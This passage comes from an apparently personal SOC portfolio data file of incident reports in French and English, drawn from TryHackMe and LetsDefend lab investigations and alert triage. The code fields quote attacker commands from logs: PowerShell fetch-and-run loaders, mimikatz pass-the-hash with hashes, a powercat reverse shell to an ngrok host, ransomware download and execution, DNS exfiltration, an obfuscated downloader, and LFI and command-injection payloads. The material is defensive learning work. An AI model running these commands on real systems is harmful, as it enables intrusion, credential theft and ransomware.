-C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -useb); Invoke-Bloodhound -c all

-C iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile m.zip
-C Expand-Archive m.zip
"C:\\Windows\\Temp\\m\\x64\\mimikatz.exe" "sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe" exit`
                            },
                            {
                                title: "6 - DÉPLACEMENT LATÉRAL",
                                desc: "L'attaquant s'est connecté au compte de james.cromwell et a modifié le mot de passe de l'utilisatrice anna.jones via la ligne de commande. Il importe ensuite PowerView pour effectuer des requêtes sur le domaine et mettre à jour les mots de passe via des commandes PowerShell plus discrètes, plutôt que par des lignes de commande classiques plutôt visibles. En se connectant au profil d' anna.jones sur une autre station, l'attaquant lance SharpChromium pour extraire les identifiants, mots de passe et cookies enregistrés dans les navigateurs web.",
                                code: `C:\\Windows\\system32\\net1  users anna.jones pwn3dpw!!! /domain

-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-Domain
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroup
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Set-DomainUserPassword -Identity anna.jones -AccountPassword (ConvertTo-SecureString 'pwn3dpw!!!' -AsPlaintext -Force) -Domain swiftspendfinancial.thm -Verbose

"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" iwr http://www.7zipp.org/a/7zipp.dll -outfile C:\\Users\\anna.jones\\Downloads\\7zip.dll

-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1 -useb); Invoke-SharpChromium -Command 'all'`
                            },
                        ]
                    },
                    {
                        name: "Phase Finale",
                        steps: [
                            {
                                title: "7 - PERSISTANCE DANS LE DOMAINE",
                                desc: "En utilisant les identifiants de l'administrateur informatique (itadmin) récupérés précédemment, l'attaquant a utilisé PowerView pour ajouter anna.jones au groupe de sécurité à privilèges élevés AD Recovery. L'attaquant utilise ensuite SharpKatz et mimikatz pour utiliser l'identité d'un contrôleur de domaine pour extraire les empreintes de mots de passe (hashes) de l'utilisateur damian.hall directement depuis la base de données Active Directory.",
                                code: `-C $username='SSF\\itadmin'; $password='NoO6@39Sk0!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $new_creds = New-Object System.Management.Automation.PSCredential $username, $securePassword; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Add-DomainGroupMember -Identity 'AD Recovery -Members anna.jones -Credential $new_creds -Verbose

-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb); Invoke-Sharpkatz -Command '--Command dcsync --Domain swiftspendfinancial.thm --DomainController DC-01.swiftspendfinancial.thm --User damian.hall'
-C .\\mimikatz.exe 'sekurlsa::pth /user:damian.hall /domain:swiftspendfinancial.thm /ntlm:eb1892cb0a163e122bc71be173c66fed /run:powershell.exe' 'exit’`
                            },
                            {
                                title: "8 - ACTIONS SUR LES OBJECTIFS",
                                desc: "L'attaquant a utilisé l'exécution à distance via PowerShell (Invoke-Command) pour déployer le ransomware bomb.exe sur les stations cibles WKSTN-02 et WKSTN-03, chiffrant les fichiers importants dans les dossiers de documents des deux utilisateurs.",
                                code: `C Invoke-Command -ScriptBlock {cd C:\\Users\\anna.jones; iwr http://www.7zipp.org/a/777bomb.exe -outfile bomb.exe; pwd; .\\bomb.exe; ls -rec -file } -ComputerName WKSTN-02.swiftspendfinancial.thmC Invoke-Command -ScriptBlock {cd C:\\Users\\perry.parsons\\;.\\bomb.exe;ls -rec -file} -ComputerName WKSTN-03.swiftspendfinancial.thm

ParameterBinding(Out-Default): name="InputObject"; value="[] Encrypting: Documents\\Audit_Reports\\Network_Audit_Report.pdf"
ParameterBinding(Out-Default): name="InputObject"; value="[] Encrypting: Documents\\Audit_Reports\\Security_Audit_Report.pdf"`
                            }
                        ]
                    }
                ]
            },
            {
                id: "thm-hunt-me1",
                category: "investigation",
                name: "Hunt Me I (TryHackme)",
                severity: "Critique",
                summary: "Le 15 septembre 2023, un incident de phishing ciblé a entraîné une exfiltration de données suite à la compromission totale d'un poste de travail de SwiftSpend. Un cadre a été victime d'un e-mail avec une fausse facture, téléchargeant une archive malveillante qui a exécuté un payload PowerShell sans fichier (fileless). L'attaquant a établi un canal de Command and Control (C2), a procédé à une énumération du réseau interne, et a connecté un partage de fichiers financiers sensibles. En utilisant des binaires légitimes du système (LOLBins), l'acteur de menace a collecté des fichiers d'entreprise confidentiels et les a exfiltrés avec succès avant d'exécuter des commandes pour effacer les traces de navigation.",
                macrophases: [
                    {
                        name: "Phase Initiale",
                        steps: [
                            {
                                title: "1 - ACCÈS INITIAL",
                                desc: "Un utilisateur a téléchargé un faux fichier .zip reçu par e-mail. Un fichier raccourci .lnk  suspect avec une double extension en a été extrait.",
                                code: `Image: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE
file.name: Invoice_AT_2023-227.zip
file.path: C:\\Users\\michael.ascot\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\UP4KOJQB\\Invoice_AT_2023-227.zip

file.name: Payment_Invoice.pdf.lnk.lnk`
                            },
                            {
                                title: "2 - EXÉCUTION",
                                desc: "Le fichier .lnk a lancé un processus PowerShell pour télécharger et exécuter dynamiquement le script powercat.ps1 directement en mémoire, établissant ainsi une connexion (reverse shell) vers l'extérieur sur un port personnalisé via un tunnel Ngrok.",
                                code: `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell"`
                            }
                        ]
                    },
                    {
                        name: "Phase Active",
                        steps: [
                            {
                                title: "3 - DÉCOUVERTE",
                                desc: "Une fois cette connexion établie, l'attaquant a commencé à explorer et lister les informations du système en utilisant le script powerview.ps1.",
                                code: `”whoami” “whoami /priv” “net user” “net localgroup”

Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1 -Outfile PowerView.ps1`
                            },
                            {
                                title: "4 - DÉPLACEMENT LATÉRAL",
                                desc: "L'attaquant s'est connecté au partage de fichiers contenant les documents financiers.",
                                code: '"C:\\Windows\\system32\\net.exe" use Z: \\\\FILESRV-01\\SSF-FinancialRecords'
                            },
                            {
                                title: "5 - COLLECTE DE DONNÉES",
                                desc: `Un dossier nommé "exfiltration" a été créé. Deux fichiers ont été récupérés depuis le partage réseau et déplacés dans ce dossier à l'aide de l'outil Robocopy.exe. Ils ont ensuite été compressés dans une archive .zip pour préparer leur envoi.`,
                                code: `C:\\Users\\michael.ascot\\Downloads\\exfiltration

"C:\\Windows\\system32\\Robocopy.exe" . C:\\Users\\michael.ascot\\downloads\\exfiltration /E
C:\\Users\\michael.ascot\\Downloads\\exfiltration\\ClientPortfolioSummary.xlsx
C:\\Users\\michael.ascot\\Downloads\\exfiltration\\InvestorPresentation2023.pptx
C:\\Users\\michael.ascot\\Downloads\\exfiltration\\exfilt8me.zip`
                            }
                        ]
                    },
                    {
                        name: "Phase Finale",
                        steps: [
                            {
                                title: "6 - EXFILTRATION DE DONNÉES",
                                desc: "Les données ont été encodées et découpées pour être envoyées à travers des sous-domaines de haz4rdw4re.io en utilisant une multitude de requêtes de recherche DNS (nslookup).",
                                code: `"C:\\Windows\\system32\\nslookup.exe" HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA.haz4rdw4re.io`
                            },
                            {
                                title: "7 - ÉVASION DE DÉFENSE",
                                desc: "L'attaquant a utilisé rundll32.exe pour effacer ses traces en appelant le composant inetcpl.cpl avec des options spécifiques, ce qui a vidé l'historique du système, le cache du navigateur, les journaux (logs) et les cookies générés pendant l'attaque.",
                                code: `C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\inetcpl.cpl,ClearMyTracksByProcess Flags:8388616 WinX:0 WinY:0 IEFrame:0000000000000000
C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\inetcpl.cpl,ClearMyTracksByProcess Flags:276824072 WinX:0 WinY:0 IEFrame:0000000000000000`
                            }
                        ]
                    }
                ]
            }
        ]
    },
    en: {
        title: "Incident Reports",
        subtitle: "Threat analysis and technical investigations.",
        viewMore: "View full investigation",
        allAlerts: "[ → View all investigations ]",
        // Short Format (SIEM/Simulator Alerts)
        shortReports: [
            {
                id: "118",
                category: "triage",
                name: "SOC168 - Whoami Command Detected in Request Body",
                time: "Feb 28, 2026, 04:12",
                severity: "HIGH",
                verdict: "True Positive",
                analysis: "Malicious traffic from external chinanet IP 61.177.172.87 flagged 4 times on VirusTotal,  reported on AbuseIPDB, untrusted on Cisco, not in our Threat Intel. To Internal web server IP 172.16.17.16. Successful command injection via permitted HTTPS POST request https[://]172.16.17.16/video/. Not planned.",
                remediation: "Immediately isolate the internal web server. Escalate to Tier 2."
            },
            {
                id: "120",
                category: "triage",
                name: "SOC170 - Passwd Found in Requested URL - Possible LFI Attack",
                time: "Mar 1, 2026, 10:10",
                severity: "HIGH",
                verdict: "True Positive",
                analysis: "Malicious HTTP GET request form external IP 106.55.45.162 static, web hosting by Tencent, Chinese company. Reported 3454x on AbuseIPDB for brute force and ssh, not flagged on VirusTotal, not in our Threat Intel. To internal WebServer1006 IP 172.16.17.13. Local file inclusion attempt “../../../../etc/passwd” in URL. Not a planned activity. HTTP response code 500 so not successful + no sign of success in terminal history, network action browser history or processes on endpoint.",
                remediation: "Patch the application code to sanitize URL inputs."
            },
            {
                id: "113",
                category: "triage",
                name: "SOC163 - Suspicious Certutil.exe Usage",
                time: "Mar, 01, 2022, 11:06 AM",
                severity: "MEDIUM",
                verdict: "True Positive",
                analysis: "Certutil.exe suspicious binary supplied. Suspicious file download nmap.zip. Performed by endpoint 172.16.17.22.",
                remediation: "Contained host. Escalate to tier 2."
            },
            {
                id: "316",
                category:"triage",
                name: "Alert name: SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing",
                time: "Mar, 13, 2025, 09:44 AM",
                severity: "Critical",
                verdict: "True Positive",
                analysis: "Suspicious inbound email delivered Mar, 13, 2025, 09:44 AM from SMTP 132.232.40.201 external email update@windows-update.site to internal email dylan@letsdefend.io with a link to hxxps[://]www[.]windows-update[.]site/. No attachment. The url was accessed.",
                remediation: "Email deleted, host contained."
            },
            {
                id: "1023-1020",
                category:"triage",
                name: "Powershell Script in Downloads Folder - Suspicious Parent Child Relationship",
                time: "Feb 21st 2026 at 19:16",
                severity: "Low",
                verdict: "True Positive",
                analysis: "On michael Ascott’s endpoint win-3450 download of malicious script PowerView.ps1 responsible for start of data breach and running of Robocopy.exe responsible for exfiltration of data.",
                remediation: "Contain victim endpoint, block outgoing data."
            },
            {
                id: "1005",
                category:"triage",
                name: "Suspicious Attachment found in email",
                time: "Feb 21st 2026 at 18:55",
                severity: "Low",
                verdict: "True Positive",
                analysis: "Inbound email from external email john@hatmakereurope.xyz to internal email michael.ascot@tryhatme.com. Contains attachment ImportantInvoice-Febrary.zip - Social engineering urgency to click right now.",
                remediation: "Delete email, block email sender address, tune rule to block phishing emails, train staff against phishing."
            },
            {
                id: "1024-1022",
                category:"triage",
                name: "Network drive disconnected from a local drive - Network drive mapped to a local drive",
                time: "Feb 21st 2026 at 19:19",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "CEO Michael Ascott's endpoint - win-3450. Malicious payload PowerView.ps1 downloaded by attacker. exfilt8me.zip file created. Data exfiltration to that file performed. Data deleted.",
                remediation: "Contain the victim endpoint, block outgoing file traffic, recover data."
            },
            {
                id: "1025-1034",
                category:"triage",
                name: "Suspicious parent child relationship ",
                time: "02/21/2026 18:18:06",
                severity: "High",
                verdict: "True Positive",
                analysis: "CEO Michael Ascott's endpoint - win-3450. Malicious payload PowerView.ps1 downloaded by attacker. exfilt8me.zip file created. Data exfiltration to that file performed. Data deleted.",
                remediation: "Contain host. Block all outgoing traffic. Recover data."
            },
            {
                id: "1003",
                category:"triage",
                name: "Suspicious email from external domain",
                time: "02/20/2026 22:19:31.",
                severity: "Low",
                verdict: "False Positive",
                analysis: "Email from external address  leonard@fashionindustrytrends.xyz to internal address  yani.zubair@tryhatme.com no attachment just selling something. Nothing malicious.",
                remediation: "Block sender email, teach staff about phishing, tune rule to block spam email."
            },
            {
                id: "1002",
                category:"triage",
                name: "Suspicious parent child relationship",
                time: "02/20/2026 22:19:13",
                severity: "Low",
                verdict: "False Positive",
                analysis: "On host win-3451 process command line ran taskhostw.exe KEYROAMING parent process is svchost.exe - Nothing suspicious.",
                remediation: "Tune alert rule to avoid false positives."
            },
            {
                id: "1001",
                category:"triage",
                name: "Suspicious parent child relationship",
                time: "02/20/2026 22:16:49",
                severity: "Low",
                verdict: "False Positive",
                analysis: "On host win-3459 - Process name: TrustedInstaller.exe - Parent process: services.exe - Process command line: C:\\Windows\\servicing\\TrustedInstaller.exe - Normal process.",
                remediation: "Tune alert rule to avoid false positives."
            },
            {
                id: "1000",
                category:"triage",
                name: "Suspicious email from external domain",
                time: "02/20/2026 22:14:25",
                severity: "Low",
                verdict: "False Positive",
                analysis: "Email from eileen@trendymillineryco.me to support@tryhatme.com social engineering to get bank details. Just spam no negative impact on business.",
                remediation: "Block sender email address, modify alert rule to not pickup spam, modify email filter to stop spam"
            },
            {
                id: "314",
                category:"triage",
                name: "SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)",
                time: "Feb, 04, 2025, 04:18 PM",
                severity: "Critical",
                verdict: "True Positive",
                analysis: "The malware mail.rtf SHA256: df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184 isn’t quarantined and is malicious, flagged by 27 vendors on VirusTotal, tagged in our Threat Intel. The C2 address 84.38.130.118 has been accessed.",
                remediation: " 172.16.17.137 contained. Quarantine malware. Block C2 address."
            },
            {
                id: "313",
                category:"triage",
                name: "SOC335 - CVE-2024-49138 Exploitation Detected",
                time: "Jan, 22, 2025, 02:37 AM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Malware svohost.exe process not quarantined hash SHA256: b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9 identified on endpoint  172.16.17.207. Flagged 51 times on VirusTotal, malicious in Hybrid Analysis, tagged CVE in our Threat Intel. No C2 address.",
                remediation: "Quarantine the process. Contain host. Escalate to tier 2."
            },
            {
                id: "304",
                category:"triage",
                name: "SOC326 - Impersonating Domain MX Record Change Detected",
                time: "Sep, 17, 2024, 12:05 PM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Email sent Sep, 17, 2024, 12:05 PM from no-reply@cti-report.io SMTP 64.233.180.27 to soc@letsdefend.io, no attachment, 2 URLs. letsdefwnd[.]io - mail.mailerhost[.]net - URLs not malicious, letsdefwnd[.]io tagged for phishing in our Threat Intel",
                remediation: "Block both url. Teach staff about phishing."
            },
            {
                id: "263",
                category:"triage",
                name: "SOC287 - Arbitrary File Read on Checkpoint Security Gateway [CVE-2024-24919]",
                time: "Jun, 06, 2024, 03:12 PM ",
                severity: "High",
                verdict: "True Positive",
                analysis: "Malicious Inbound HTTP POST method from web hosting China Unicom IP  203.160.68.12, flagged twice on VirusTotal, reported twice on AbuseIPDB, linked to CVE in our Threat Intel. To internal server destination IP 172.16.20.146 CP-Spark-Gateway-01. Local file inclusion with path traversal aCSHELL/../../../../../../../../../../etc/passwd and aCSHELL/../../../../../../../../../../etc/shadow on url 172.16.20.146/clients/MyCRL. Successful according to logs and endpoint network connection. Not a planned test.",
                remediation: "Contain host, block malicious IP, escalate to tier 2, fix path traversal issue."
            },
            {
                id: "257",
                category:"triage",
                name: "SOC282 - Phishing Alert - Deceptive Mail Detected",
                time: "May, 13, 2024, 09:22 AM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Email sent May, 13, 2024, 09:22 AM from free@coffeeshooop.com smtp address 103.80.134.63 to Felix@letsdefend.io. Mail contains social engineering to click on link https[://]download.cyberlearn.academy/download/download?url=https[://]files-ld.s3.us-east-2.amazonaws.com/59cbd215-76ea-434d-93ca-4d6aec3bac98-free-coffee.zip that downloads attachment free-coffee[.]zip. Link flagged as malicious by 11 vendors on VirusTotal. Email was delivered to the user. Link was clicked and the address accessed. ",
                remediation: "Delete the email. Host contained. Teach staff about phishing. Block smtp, email, link and attachment."
            },
            {
                id: "249",
                category:"triage",
                name: "SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)",
                time: "Apr, 18, 2024, 03:09 AM",
                severity: "Critical",
                verdict: "True Positive",
                analysis: "Command injection from external IP 144.172.79.92 web hosting company  Frantech solutions flagged 11 times on VirusTotal, 1 report on AbuseIPDB, malicious in our Threat Intel. To internal IP 172.16.17.139 PA-Firewall-01. HTTP POST method to URL 172.16.17.139/global-protect/login.esp command injection in cookies: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami). Not a planned test. Attack successful according to log within the endpoint with raw data dt_send INFO TX FILE: send_fname: /opt/panlogs/tmp/device_telemetry/day/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami) and a network connection to the malicious IP at same timestamp.",
                remediation: "Contained the host. Escalated to tier 2. Fix injection issue."
            },
            {
                id: "238",
                category:"triage",
                name: "SOC153 - Suspicious Powershell Script Executed",
                time: "Feb 13, 2026, 08:37 PM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Powershell script payload.ps1 flagged on VirusTotal by 31 vendors as malicious, nothing in our Threat Intel, was executed on Tony’s endpoint IP 172.16.17.206. Accessed C2 address: hxxps[://]kionagranada[.]com/upload/beauty[.]exe, which is flagged on VirusTotal by 9 vendors.",
                remediation: "Contained the host. Eradicate payload. "
            },
            {
                id: "235",
                category:"triage",
                name: "SQL Injection Detected",
                time: "Mar, 07, 2024, 12:51 PM",
                severity: "High",
                verdict: "True Positive",
                analysis: "External malicious IP 118.194.247[.]28 from china flagged by 9 vendors on VirusTotal, reported 4204 times for brute force and ssh on AbuseIPDB, untrusted on cisco talos, not reported in our Threat Intel. Performed an SQL injection through our internal WebServer1000 IP: 172.16.20.12. The log that triggered the alert contains: SQL injection, cross-site-scripting, Remote Code Execution and Local File Inclusion, user-agent: sqlmap/1.7.2, 20 additionnal logs using the same methods. Not a planned test. The attack was successful as the endpoint’s command line shows the executed commands and the status codes 200.",
                remediation: "Contain the host. Block traffic from 118.194.247[.]28. Check other endpoints for lateral movement. Update code to avoid sql injection."
            },
            {
                id: "234",
                category:"triage",
                name: "RDP Brute Force Detected",
                time: "Mar, 07, 2024, 11:44 AM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "External IP 218.92.0.56, flagged 7 times on ViruTotal, malicious in our Threat Intel, reported 400000x on AbuseIPDB, performed a brute force attack on the endpoint IP 172.16.17.148. Multiple failed logon observed on RDP port 3389 and then a successful one. On the victim endpoint the network action with IP 218.92.0.56 noticed confirms the logon. In terminal history at 11:46 after the brute force, commands for discovery can be seen. tvnserver.exe launched at 11:45, and suspicious files were installed after that.",
                remediation: "Host contained. Block IP 218.92.0.56 for RDP. Check other endpoints for IP 218.92.0.56. Watch for repeated failed logons."
            },
            {
                id: "8817",
                category:"triage",
                name: "Inbound email containing suspicious external link",
                time: "02/11/2026 09:41:12",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Suspicious email from no-reply@m1crosoftsupport.co to c.allen@thetrydaily.thm impersonates as microsoft support using social engineering and typosquatting with a supicious link to click: hxxps[://]m1crosoftsupport[.]co/login.No evidence in the logs that the user has clicked and tried to access the link.",
                remediation: "Block email sender address. List link in blocked links for firewall. Delete email. Send out email about current phishing campaign."
            },
            {
                id: "8815-8816",
                category:"triage",
                name: "Inboud email containing suspicious external link- Access to Blacklisted external URL Blocked by firewall",
                time: "02/11/2026 09:38:08",
                severity: "High",
                verdict: "True Positive",
                analysis: "The user IP: 10.20.2.17 clicked on a suspicious URL: hxxp[://]bit[.]ly/3sHkX3da12340 the access was blocked by a firewall, the url is flagged by one vendor on VirusTotal for phishing. An email sent from urgents@amazon.biz impersonates amazon, creates a sense of urgency to click on a link. The URL IP is: 67.199.248.11 reported 848 times on AbuseIPDB for phishing, web spam, email spam.",
                remediation: "Block the email sender address, block the IP address to the link, remind staff about phishing emails."
            },
            {
                id: "8814",
                category:"triage",
                name: "Inbound email containing suspicious external link",
                time: "02/11/2026 09:37:45",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Suspicious email from onboarding@hrconnex.thm to j.garcia@thetrydaily.thm impersonates as onboarding validation with a supicious link: hxxps[://]hrconnex[.]thm/onboarding/15400654060/j[.]garcia. No evidence in the logs that Julia Garcia has clicked and tried to access the link.",
                remediation: "Block email sender address."
            },
            {
                id: "214",
                category:"triage",
                name: "SOC251 - Quishing Detected (QR Code Phishing)",
                time: "Jan, 01, 2024, 12:37 PM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "SMTP Address:158.69.201.47 - flagged for phishing in our Threat Intel, reported 340 times on AbuseIPDB for SQL injection Brute-Force Bad Web Bot and Web App Attack, flagged as malicious by 6 vendors on VirusTotal for phishing - Source address: security@microsecmfa.com - suspicious and not a valid microsoft account email address.Destination address: claire@letsdefend.io - Email time: Jan, 01, 2024, 12:00 PM. Email sent claiming to be the Microsoft Team using social engineering with urgency and impersonation to prompt the person to use the QR code. No evidence of the code being scanned on the victim’s endpoint.",
                remediation: "Delete the email, report the malicious IP address and block it. Block the sender email address. "
            },
            {
                id: "225",
                category:"triage",
                name: "SOC257 - VPN Connection Detected from Unauthorized Country",
                time: "13/02/2024 02:04 AM",
                severity: "Low",
                verdict: "True Positive",
                analysis: " monica@letsdefend.io has received an email from security@letsdefend.io IP address 113.161.158.12  flagged as malicious by two vendors on VirusTotal and for brute force on our Threat Intel - 3 separate emails with a one time password to activate multi factor authentication and a link https://vpn-letsdefend.io. On the victim’s endpoint suspicious parent process “sihost.exe” and running process from this command 'C:\\Windows\\system32\\BackgroundTaskHost.exe' -ServerName:BackgroundTaskHost.WebAccountProvider. Multiple suspicious commands in terminal indicating discovery: systeminfo - ipconfig /all - netstat -ano - tasklist - ver - driverquery - net user - wmic product get name. All logs from the malicious IP address 113.161.158.12 go to the IP address 33.33.33.33.",
                remediation: "Contain the host."
            },
            {
                id: "320",
                category:"triage",
                name: "SOC342 - CVE‑2025‑53770 SharePoint ToolShell Auth Bypass and RCE",
                time: "22/07/2025 13:07",
                severity: "Critical",
                verdict: "True Positive",
                analysis: "Source IP 107.191.58.76 - Destination IP 172.16.20.17 - Hostname: SharePoint01 - POST request for /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx with unusually large content-length. Network connection between host SharePoint01 and source IP 107.191.58.76 confirmed at 13:08. Execution of suspicious file from the POST request in host’s command line.",
                remediation: "I have contained the host and escalated to tier 2."
            },
            {
                id: "119",
                category:"triage",
                name: "SOC169 - Possible IDOR Attack Detected",
                time: "Feb, 28, 2022, 10:48 PM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Malicious POST requests from external IP 134.209.118.137 reported on abuseipdb and cisco talos not in our Threat Intel. To internal web server 172.16.17.15. Successful IDOR https://172.16.17.15/get_user_info/?user_id=1. Not a planned activity.",
                remediation: "Isolate the webserver. Escalate to tier 2."
            },
            {
                id: "114",
                category:"triage",
                name: "SOC164 - Suspicious Mshta Behavior",
                time: "Mar, 05, 2022, 10:29 AM ",
                severity: "High",
                verdict: "True Positive",
                analysis: `LOLbin mshta is used to execute a powershell script on the 172.16.17.38 endpoint which attempts to download a file unsuccessfully, blocked by the firewall. C:/Windows/System32/mshta.exe C:/Users/roberto/Desktop/Ps1.hta
C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe function H1($i) {$r = '' ;for ($n = 0; $n -Lt $i.LengtH; $n += 2){$r += [cHar]int)}return $r};$H2 = (new-object ('{1}{0}{2}' -f'WebCL','net.','ient'));$H3 = H1 '446f776E';$H4 = H1 '6C6f';$H5 = H1 '616473747269';$H6 = H1 '6E67';$H7 = $H3+$H4+$H5+$H6;$H8 = $H2.$H7('http://193.142.58.23/Server.txt');iEX $H8.`,
                remediation: "Contain the endpoint."
            },
            {
                id: "123",
                category:"triage",
                name: "SOC173 - Follina 0-Day Detected",
                time: "Jun, 02, 2022, 03:22 PM",
                severity: "Medium",
                verdict: "True Positive",
                analysis: "Trojan md5: 52945af1def85b171870b31fa4782e52 executed on endpoint 172.16.17.39 is not quarantined, has connected to the C2 address https[://]www.xmlformats.com/office/word/2022.",
                remediation: "Contain the host."
            },
            {
                id: "125",
                category:"triage",
                name: "SOC175 - PowerShell Found in Requested URL - Possible CVE-2022-41082 Exploitation ",
                time: "Sep, 30, 2022, 07:19 AM",
                severity: "High",
                verdict: "True Positive",
                analysis: "Malicious traffic from Korean IP 58.237.200.6 reported on AbuseIPDB not in our Threat Intel, to internal Exchange Server IP 172.16.20.8. Failed powershell remote command execution through url /autodiscover/autodiscover.json?@evil.com/owa/&Email=autodiscover/autodiscover.json%3f@evil.com&Protocol=XYZ&FooProtocol=Powershell. Not a planned test.",
                remediation: "Don’t escalate."
            }
        ],

        // Long Format (Full Investigation Reports)
        longReports: [
            {
                id: "thm-slingshot",
                category: "investigation",
                name: "Slingshot (TryHackme)",
                severity: "Critical",
                summary: "The analysis of the audit logs shows a full compromise of the web server ( 172.16.17.16 ) by an external attacker ( 10.0.2.15 ). After a reconnaissance phase and a successful brute-force attack, the attacker exploited a file upload and local file inclusion vulnerability to gain access to the database, exfiltrate credit card information and alter the integrity of the database.",
                macrophases: [
                    {
                        name: "Initial Phase",
                        steps: [
                            {
                                title: "1 - RECONNAISSANCE AND ENUMERATION",
                                desc: `The attacker started by actively mapping the web app with automated tools. Nmap scripting engine is used to enumerate directory, analyze headers and detect vulnerabilities. 
                                Gobuster is used to enumerate the directory, /admin page is found (HTTP response code 301) and 9 other pages are found (HTTP response code 200) including a stocking directory containing a compromising flag.`,
                                code: `GET /robots.txt HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) 
Source IP: 10.0.2.15 | Status: 200 OK
GET /backups/?flag=a76637b62ea99acda12f5859313f539a HTTP/1.1
Source IP: 10.0.2.15 | Status: 200 OK`
                            },
                            {
                                title: "2 - INITIAL EXECUTION AND DISCOVERY",
                                desc: "A php webshell is then uploaded by the attacker to obtain remote command execution on the web server and some discovery commands are executed. Directory traversal is used by the attacker to find database credentials and obtains access to the phpmyadmin database by local file inclusion with a php wrapper",
                                code: `/admin/upload.php?action=upload Mozilla/5.0 (X11; Linux
x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 10.0.2.15 302 POST
name="file";
filename="easy-simple-php-webshell.php"
/uploads/easy-simple-php-webshell.php?cmd=whoami
/uploads/easy-simple-php-webshell.php?cmd=pwd
/uploads/easy-simple-php-webshell.php?cmd=ls
/uploads/easy-simple-php-webshell.php?cmd=which+nc
/admin/settings.php?page=../../../../../../../../etc/passwd
/admin/settings.php?page=../../../../../../../../proc/self/environ
/admin/settings.php?page=../../../../../../../../etc/phpmyadmin/config-db.php
/admin/settings.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../etc/phpmyadmin/config-db.php`
                            }
                        ]
                    },
                    {
                        name: "Active Phase",
                        steps: [
                            {
                                title: "3 - INITIAL ACCESS",
                                desc: "Hydra is used to brute force the login page, successful with insecure username:password admin:thx1138",
                                code: "/admin-login.php Mozilla/4.0 (Hydra) 10.0.2.15 200 GET"
                            },
                            {
                                title: "4 - DATA EXFILTRATION",
                                desc: "The attacker accesses the cutomer_credit_cards database and the credit_cards table and then exports the credit_cards table.",
                                code: `/admin-login.php Mozilla/4.0 (Hydra) 10.0.2.15 200 GET
/phpmyadmin/tbl_export.php?db=customer_credit_cards&table=credit_cards&single_table=true`
                            }
                        ]
                    },
                    {
                        name: "Final Phase",
                        steps: [
                            {
                                title: "5 - DATA MANIPULATION",
                                desc: "The attacker adds an entry to the customer_credit_cards database",
                                code: `/phpmyadmin/import.phpis_js_confirmed=0&db=customer_credit_cards&table=credit_cards&token=302e562342217c5d6258344222294172&pos=0&goto=tbl_sql.php&message_to_show=YourSQL query has been executed successfully.&prev_sql_query=INSERT INTO'credit_cards' ('card_number', 'cardholder_name', 'expiration_date', 'cvv')VALUES ('000', 'c6aa3215a7d519eeb40a660f3b76e64c', '000','000');&sql_query=INSERT INTO 'credit_cards' ('card_number','cardholder_name', 'expiration_date', 'cvv') VALUES ('000', 'c6aa3215a7d519eeb40a660f3b76e64c','000','000');&sql_delimiter=;&show_query=1&fk_checks=0&fk_checks=1&SQL=Go&ajax_request=true&ajax_page_request=true&_nocache=169038208497548768&token=302e562342217c5d6258344222294172`
                            },
                            {
                                title: "6 - VALIDATION",
                                desc: "The attacker exports the credit_cards table again.",
                                code: "/phpmyadmin/tbl_export.php?db=customer_credit_cards&table=credit_cards&single_table=true"
                            }
                        ]
                    }
                ]
            },
            {
                id: "thm-hunt-me2",
                category: "investigation",
                name: "Hunt Me II (TryHackme)",
                severity: "Critical",
